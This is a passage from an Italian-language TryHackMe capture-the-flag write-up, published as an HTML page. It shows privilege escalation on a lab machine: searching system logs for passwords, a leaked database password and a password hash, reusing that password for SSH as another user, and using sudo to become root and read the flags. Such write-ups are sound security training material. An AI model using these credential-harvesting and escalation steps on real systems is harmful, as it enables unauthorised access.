+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>tim
+</span></code></pre></div></td></tr></table></div>
+<p>Usa un kernel abbastanza vecchio <code>Linux 5.15</code> </p>
+<p>E otteniamo al prima flag</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>tim@ip-10-129-174-38:~$<span class="w"> </span>cat<span class="w"> </span>user.txt<span class="w"> </span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>THM<span class="o">{</span>c4ca42************************<span class="o">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>ora dobbiamo escalare i nostri privilegi a root.</p>
+<p>L’utente <code>tim</code> fa parte di due gruppi <code>tim</code> e <code>adm</code> </p>
+<p>Usando <code>ps auxww</code> è possibile vedere che i webserver sono avviati come utente <strong><code>root</code></strong> quindi, ogni operazione fatta è eseguita come root, se riuscissimo a instauare una reverse shell, otterremo subito i permessi di root.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>root<span class="w">        </span><span class="m">1210</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w"> </span><span class="m">1155572</span><span class="w"> </span><span class="m">3216</span><span class="w"> </span>?<span class="w">        </span>Sl<span class="w">   </span><span class="m">15</span>:50<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/usr/bin/docker-proxy<span class="w"> </span>-proto<span class="w"> </span>tcp<span class="w"> </span>-host-ip<span class="w"> </span>::<span class="w"> </span>-host-port<span class="w"> </span><span class="m">8080</span><span class="w"> </span>-container-ip<span class="w"> </span><span class="m">172</span>.17.0.3<span class="w"> </span>-container-port<span class="w"> </span><span class="m">8000</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Se riuscissimo ad accedere all’account SSH di <code>tyler</code> avremmo molti più permessi essendo in molti più gruppi:  <code>tyler : tyler adm cdrom sudo dip plugdev lxd</code></p>
+<p>Sapendo che l’utente ha i permessi <code>adm</code> possiamo leggere i log in <code>/var/log</code>. usando un comando che cerca la parola <code>PASSWORD</code> in tutti i file di log possiamo ottenere i dati del DB </p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>/var/log/auth.log.2:118:Dec<span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">15</span>:45:57<span class="w"> </span>silver-platter<span class="w"> </span>sudo:<span class="w">    </span>tyler<span class="w"> </span>:<span class="w"> </span><span class="nv">TTY</span><span class="o">=</span>tty1<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">PWD</span><span class="o">=</span>/<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>root<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/docker<span class="w"> </span>run<span class="w"> </span>--name<span class="w"> </span>silverpeas<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>:8000<span class="w"> </span>-d<span class="w"> </span>-e<span class="w"> </span><span class="nv">DB_NAME</span><span class="o">=</span>**Silverpeas**<span class="w"> </span>-e<span class="w"> </span><span class="nv">DB_USER</span><span class="o">=</span>**silverpeas**<span class="w"> </span>-e<span class="w"> </span><span class="nv">DB_PASSWORD</span><span class="o">=</span>**_Zd_zx7N823/**<span class="w"> </span>-v<span class="w"> </span>silverpeas-log:/opt/silverpeas/log<span class="w"> </span>-v<span class="w"> </span>silverpeas-data:/opt/silvepeas/data<span class="w"> </span>--link<span class="w"> </span>postgresql:database<span class="w"> </span>silverpeas:6.3.1
+</span></code></pre></div></td></tr></table></div>
+<p>sembra però accessibile solo dalla macchina docker stessa e non dall’host.</p>
+<p>Notiamo anche questo log</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>/var/log/installer/autoinstall-user-data:29:<span class="w">    </span>password:<span class="w"> </span><span class="nv">$6$uJuA1kpnd4kTFniw</span>$/402iWwKzcYD8AMHG6bY/PXwZWOkrrVmtoO7qQpfvVLh1CHmiKUodwMGP7/awDYtrzpDHV8cNbpS1HJ6VMakN.
+</span></code></pre></div></td></tr></table></div>
+<p>Utilizzando la password del DB trovate possiamo loggarci come <code>tyler</code> in SSH</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span>
+<span class="normal"><a href="#__codelineno-15-6">6</a></span>
+<span class="normal"><a href="#__codelineno-15-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>tyler@ip-10-128-178-162:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>tyler:<span class="w"> </span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>tyler<span class="w"> </span>on<span class="w"> </span>ip-10-128-178-162:
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,<span class="w"> </span>use_pty
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a>User<span class="w"> </span>tyler<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>ip-10-128-178-162:
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a><span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>ALL
+</span></code></pre></div></td></tr></table></div>
+<p>dove possiamo eseguire qualsiasi comando come sudo</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>tyler@ip-10-128-178-162:~$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>sudo<span class="w"> </span>su
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>root@ip-10-128-178-162:/home/tyler#<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>E siamo diventati <strong>root</strong></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span>
+<span class="normal"><a href="#__codelineno-17-5">5</a></span>
+<span class="normal"><a href="#__codelineno-17-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>root@ip-10-128-178-162:/home/tyler#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/root/
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>root@ip-10-128-178-162:~#<span class="w"> </span>ls
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>root.txt<span class="w">  </span>snap<span class="w">  </span>start_docker_containers.sh
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>root@ip-10-128-178-162:~#<span class="w"> </span>cat<span class="w"> </span>root.txt<span class="w"> </span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a>THM<span class="o">{</span>098f6b**************************<span class="o">}</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>root@ip-10-128-178-162:~#<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p>Non ha avuto senso che la password di <strong>tyler</strong> era la stessa del <strong>database</strong> in che modo ci sarei dovuto arrivare? No sense!</p>
+<p><strong>Lezione imparata:</strong> quando si recuperano credenziali in chiaro da file di configurazione o log, non bisogna limitarne l'utilizzo al servizio a cui appartengono. È sempre opportuno verificare eventuali casi di <strong>password reuse</strong> sugli account applicativi e di sistema, prima di investire tempo nel cracking di hash.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c21346df.min.js"></script>
+      
+    
+  </body>
+</html>
